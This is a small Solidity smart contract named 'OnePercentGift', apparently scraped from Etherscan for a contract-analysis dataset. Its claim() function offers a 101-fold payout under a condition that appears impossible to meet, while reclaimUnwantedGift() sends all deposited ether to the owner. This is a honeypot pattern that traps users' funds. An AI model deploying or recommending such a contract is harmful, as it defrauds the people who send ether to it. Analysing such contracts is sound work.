/**********************************************************************
*These solidity codes have been obtained from Etherscan for extracting
*the smartcontract related info.
*The data will be used by MATRIX AI team as the reference basis for
*MATRIX model analysis,extraction of contract semantics,
*as well as AI based data analysis, etc.
**********************************************************************/
pragma solidity ^0.4.21;

contract OnePercentGift{
	
	address owner;

	function OnePercentGift(){
		owner=msg.sender;
	}

	function refillGift() payable public{

	}

	function claim() payable public{
		if(msg.value == address(this).balance * 100){
			msg.sender.transfer(msg.value * 101);
		}
	}

	function reclaimUnwantedGift() public{
		owner.transfer(address(this).balance);
	}
}